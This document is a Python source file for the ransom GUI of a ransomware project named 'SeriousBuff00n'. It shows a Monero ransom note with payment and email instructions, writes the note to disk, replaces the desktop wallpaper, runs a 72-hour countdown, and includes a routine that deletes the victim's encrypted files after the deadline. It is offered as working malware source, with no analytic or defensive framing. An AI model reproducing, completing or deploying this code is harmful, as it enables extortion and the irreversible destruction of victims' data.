from tkinter import * # GUI 
from PIL import ImageTk, Image # Resize images
from threading import Thread # Persistence GUI, remove directory
import os # Play with the OS
from os.path import dirname,realpath
import sys
from sys import path
from tkinter.font import Font # Design some label
from pyperclip import copy # Copy a label
from time import sleep
from datetime import datetime,timedelta
from ctypes import windll # Wallpaper
#Local import (others GUI)
from GUI.decrypt_one_file_free_gui import FreeDecrypt
from GUI.how_buy_monero_gui import MoneroGui
from GUI.decrypt_files_gui import DecryptFiles
# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *


class Gui(FreeDecrypt,MoneroGui,DecryptFiles) :
    
    
    def __init__(self) : 
        self.app = Tk()
        self.price_monero2()
        #Load image
        self.monero_img_path = self.resource_path("monero.png")
        self.joker_img_path = self.resource_path("joker.png")
        self.key_img_path = self.resource_path("key.png")
        self.ico_img_path = self.resource_path("bouffon.ico")
        #Load id_key
        self.recover_id_key()
        try :
            self.note = f"""
 _____           _                 ______        __  __ _____  _____       
/  ___|         (_)                | ___ \      / _|/ _|  _  ||  _  |      
\ `--.  ___ _ __ _  ___  _   _ ___ | |_/ /_   _| |_| |_| |/' || |/' |_ __  
 `--. \/ _ \ '__| |/ _ \| | | / __|| ___ \ | | |  _|  _|  /| ||  /| | '_ \ 
/\__/ /  __/ |  | | (_) | |_| \__ \| |_/ / |_| | | | | \ |_/ /\ |_/ / | | |
\____/ \___|_|  |_|\___/ \__,_|___/\____/ \__,_|_| |_|  \___/  \___/|_| |_|
                                                                           



    ######################################################################

    ALL YOUR FILES HAS BEEN ENCRYPTED BY A STRONG MILITARY ENCRYPTION !!!!
    THE ONLY WAY TO DECRYPT YOUR FILES IS OUR DECRYPTION SERVICE !!!

    FOR DECRYPT YOUR FILES YOU HAVE TO PAY {self.monero_price} IN MONERO.
    SEND THE MONEY TO THIS MONERO ADDRESS : {MONERO_ADDRESS}

    TO PROVE TO YOU OUR RELIABILITY WE ALLOW YOU TO DECRYPT ONE FILE FOR FREE !
    
    DO NOT MOVE YOUR FILES !!!
    DO NOT RENAME YOUR FILES !!!
    
    #######################################################################
                                    How buy monero ?

    1. Go to https://www.bitnovo.com/buy-criptocurrencies-bitcoin-en.
    2. Buy {self.monero_price} in Monero(XMR) equivalent of 70€.
    3. Send {self.monero_price} to this address : {MONERO_ADDRESS}.
    4. Send a email with this subject : LICENSE ACTIVATION FOR {self.id_key}. 
    TO THIS ADDRESS : {EMAIL}.
    5. Write into the mail the number of the monero transaction.
    6. You will receive by e-mail your decryption key and you will recover all your files !
    7. Enter the decryption key into "Decrypt my files" window. Click on the button decrypt and just wait the decryption of your files !
    
    You can contact us anytime by email at : {EMAIL}

    #######################################################################    

    SeriousBuff00n Team.

    """
        except :
            pass
        
        self.write_note()
        self.wallpaper()
        self.interface()


    def resource_path(self,relative_path) -> str:
        try: 
            # PyInstaller creates a temp folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        return os.path.join(base_path, relative_path)


    def write_note(self) : 
        try:
            with open(README_FILE,'w') as f: 
                f.write(self.note)
        except:pass


    def recover_id_key(self) : 
        try:
            with open(ID_KEY_PATH, 'r') as f: 
                self.id_key = f.read()
        except:pass


    def price_monero2(self) : 
        try:
            ff = open(PRICE_MONERO_PATH,'r')
            self.monero_price = ff.read()
        except:pass

        
    def resize_images(self) :
        try: 
            # joker
            photo_joker = Image.open(f'{self.joker_img_path}')
            resize_photo = photo_joker.resize((250,175), Image.ANTIALIAS)
            self.new_photo_joker = ImageTk.PhotoImage(resize_photo)
            # monero
            photo_monero = Image.open(f'{self.monero_img_path}')
            resize_photo_monero = photo_monero.resize((80,55), Image.ANTIALIAS)
            self.new_photo_monero = ImageTk.PhotoImage(resize_photo_monero)
            # key
            photo_key = Image.open(f'{self.key_img_path}')
            resize_photo_key = photo_key.resize((80,55), Image.ANTIALIAS)
            self.new_photo_key = ImageTk.PhotoImage(resize_photo_key)            
        except:pass


    def interface(self) : 
        'Interface'

        try : 
            self.app.title('SeriousBuff00n')
            self.app.geometry('1300x750')
            self.app.iconbitmap(self.ico_img_path)
            self.app['bg'] = 'red4'
            self.app.resizable(width=False,height=False)
            font_msg = Font(family='Courrier', weight='bold', underline=1,size=20)
            msg = Label(self.app,font=font_msg,text='Your files has been encrypted !', bg='red4')
            font_msg4 = Font(family='Courrier', size=15,font='Helvetica 15 bold')
            msg2 = Label(self.app,text=f'Send {self.monero_price} monero to this address : ', bg='red4', font=font_msg4)
            msg4 = Label(self.app,font=font_msg4, text="Identificaton Key : ", bg='red4')
            msg5 = Label(self.app,font=font_msg4, text=f"You can contact us anytime by email at : {EMAIL} ", bg='red4')
            #Resize images
            self.resize_images()
            font_button = Font(family='Courrier', size=15)
            button = Button(self.app,font=font_button, text='Decrypt my files', command=self.window,  width=40, height=3, bg='red4',relief='sunken')
            label_photo_joker = Label(self.app, image=self.new_photo_joker, bg='red4')
            label_photo_monero = Label(self.app, image=self.new_photo_monero, bg='red4')
            label_photo_key = Label(self.app, image=self.new_photo_key, bg='red4')
            label1_button = Font(family='Courrier', size=15)
            Button(self.app, text='How buy moneros ?', font=label1_button, bg='red4', width=40,height=3, relief='sunken',command=self.monero_window).place(x=0,y=678)
            Button(self.app, text='Decrypt One file for free', font=label1_button, bg='red4', width=40,height=3, relief='sunken',command=self.gui_free_file_decrypt).place(x=450,y=678)
            
            #Call functions
            self.text()
            self.monero_address()
            self.delete_files()
            self.timer()
            self.button_copy_address()
            self.label_id()
            msg.pack()
            msg2.place(x=890,y=370)
            msg4.place(x=890,y=520)
            label_photo_joker.place(x=5 ,y=20)
            label_photo_monero.place(x=800,y=390)
            label_photo_key.place(x=800,y=550)
            button.place(x=880,y=678)
            msg5.place(x=0,y=600)
        
            self.app.mainloop() 

        except Exception as e : 
            print('interface')
            print(e)
            pass
    

    def text(self): 
        'Text for advice target'
        try: 
            font_label1 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
            Label(self.app, font=font_label1,text='What\'s happend to my computer ?', bg='red4').place(x=900,y=29)
            Label(self.app,text='All your data is encrypted. The only way to decrypt your files is to pay.', bg='red4').place(x=900,y=55)
            font_label3 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
            Label(self.app,font=font_label3, text='Can I recover my files ?', bg='red4').place(x=900, y=80)
            Label(self.app, text='Sure. You can recover all your files easily and safestly', bg='red4').place(x=900, y=110)
            Label(self.app,text='For recover your files you have to pay', bg='red4').place(x=900,y=130)
            Label(self.app, text='You have 3 days to pay',bg='red4').place(x=900,y=150)
            Label(self.app, text='If you pass the deadline you will loose all your files and your computer', bg='red4').place(x=900,y=170)
            font_label8 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
            Label(self.app,font=font_label8, text='How do I pay ?', bg='red4').place(x=900, y=190)
            Label(self.app, text='Only Monero is accepted', bg='red4').place(x=900, y=220)
            Label(self.app, text='To buy moneros click on <How buy moneros ?>', bg='red4').place(x=900, y=240)
            Label(self.app, text=f'Send {self.monero_price} monero to the below address',bg='red4').place(x=900, y=260)
            font_label12 = Font(family='Courrier', size=13, weight='bold')
            Label(self.app, font=font_label12, text='DO NOT RENAME/MOOVE YOUR FILES !',bg='red4').place(x=900,y=300)
        except:pass


    def copy_id_key(self) : 
        try:
            copy(str(self.id_key.decode('Utf8')))
        except:pass

    def copy_address(self) : 
        try:
            copy(MONERO_ADDRESS)
        except:pass

    def button_copy_address(self) : 
        try:
            button_copy = Button(self.app, text='Copy',width=15,height=4, bg='white',command=self.copy_address).place(x=1200,y=440)
        except:pass

    def label_id(self) : 
        'Label to write Identification key'
        try : 
            with open(ID_KEY_PATH,'rb') as f : 
                self.id_key = f.read()
            Font(self.app, family='Courrier', size=10,)
            label = Text(self.app, borderwidth=3, relief="sunken", width=75,height=2)
            label.insert("1.0",self.id_key)
            button = Button(self.app, text='Copy', command=self.copy_id_key, width=15, height=4)    
            label.config(state='disabled')
            label.place(x=890,y=560)
            button.place(x=1205,y=600)
        except Exception as e: 
            print(e)
            pass


    def countdown_function(self) : 
        'Compte à rebours'
        try:
            if os.path.isfile(TODAY_PATH) is True : 
                
                # Get the date/time of first time pop
                with open(TODAY_PATH,'r') as f : 
                    launch_date = f.read() 
                    launch_date = datetime.strptime(launch_date,'%Y-%m-%d %H:%M:%S') 

                tday = datetime.today().strftime('%Y-%m-%d %H:%M:%S') 
                tday = datetime.strptime(tday,'%Y-%m-%d %H:%M:%S') 
                the_date = tday - launch_date 
                delay = timedelta(hours=72)
                countdown = timedelta(seconds=1) 
                delay = delay - the_date 

                for x in range(84600) : 
                    delay = delay - countdown
                    self.label_time.configure(text=delay)
                    sleep(1)
                    
            else : # If GUI pop the first time 
                with open(TODAY_PATH,'w') as f : 
                    tday = datetime.today().strftime('%Y-%m-%d %H:%M:%S')
                    f.write(str(tday)) # On write la date du lancement
                delay = timedelta(hours=72) # Créer un temps 
                countdown = timedelta(seconds=1) # Créer un temps a soustraire au délay
                index=0
                for x in range(84600) : # Soustrait 1sec toute les 1sec au compte a rebours
                    delay = delay - countdown
                    index += 1
                    self.label_time.configure(text=delay)
                    sleep(1)
        except:pass


    def delete_files(self) : 
        'If victim dont pay =)'
        try: 
            with open(f'{TODAY_PATH}','r') as f : # Read the deadline 
                date_first_time = f.read()
            date_first_time = datetime.strptime(date_first_time,'%Y-%m-%d %H:%M:%S') # Convertit en datetime object
            delay = timedelta(days=3)
            deadline = date_first_time+delay
            right_now = datetime.today().strftime('%Y-%m-%d %H:%M:%S')
            if deadline >= right_now:
                print('Deadline has been crossed')
                for root,sub_dir,files in os.walk(DIR_TO_HIT) : 
                    for x in files : 
                        abs_file_path = os.path.join(root,x)
                        if '.buffoon' in abs_file_path : # Delete only encrypted files
                            os.remove(abs_file_path)
            else:pass
        except:pass


    def timer(self): 
        'Label timer'
        try : 
            font_label1 = Font(size=15,weight='bold')
            Label(self.app,font=font_label1,text='Time left :',width=10,height=5,bg='red4').place(x=0,y=250)
            font_label_time = Font(size=22, weight='bold')
            self.label_time = Label(self.app,font=font_label_time,text='',width=25,height=3,bg='red4')
            #Threading
            thread_gui_1 = Thread(target=self.countdown_function,daemon=True) # Create a thread for countdown
            thread_gui_1.start()
            self.label_time.place(x=0,y=330)
        except:pass


    def monero_address(self) : 
        'display the monero address'
        try: 
            self.monero_text = Text(self.app, borderwidth=3, relief="sunken", )
            self.monero_text.insert("1.0",f"{MONERO_ADDRESS}")
            self.monero_text.config(wrap='word', state="disabled",width=150,height=2)
            self.monero_text.place(x=890, y=400)
        except:pass


    def wallpaper(self) : 
        'change_wallpaper'
        try : 
            path_wallpaper = os.path.normpath(self.joker_img_path) # Create a normal path
            SPI_SETDESKWALLPAPER = 20
            windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path_wallpaper , 0) # Change wallpaper
        except:pass


if __name__ == "__main__" : 

    gui = Gui()
    gui.recover_id_key()
    gui.interface()